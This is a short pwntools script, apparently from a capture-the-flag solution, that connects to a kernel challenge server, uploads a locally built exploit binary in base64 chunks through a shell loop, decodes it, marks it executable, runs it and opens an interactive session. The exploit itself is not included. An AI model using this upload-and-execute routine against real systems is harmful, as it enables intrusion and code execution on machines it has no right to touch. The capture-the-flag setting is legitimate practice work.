from pwn import *

# Borrowed from https://ctftime.org/writeup/14531
r = remote("babykernel.ctf.intigriti.io", 1343);
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

payload = b64e(read("./initramfs/exploit"))
log.info(f'Size of payload: {len(payload)}')

r.recvuntil(b"start");
sleep(0.5)
to_send = payload.encode()

log.info('Starting...')
while to_send:
    log.info('Sending payload...')
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]
r.send(b"\nend\n")

r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")
r.interactive()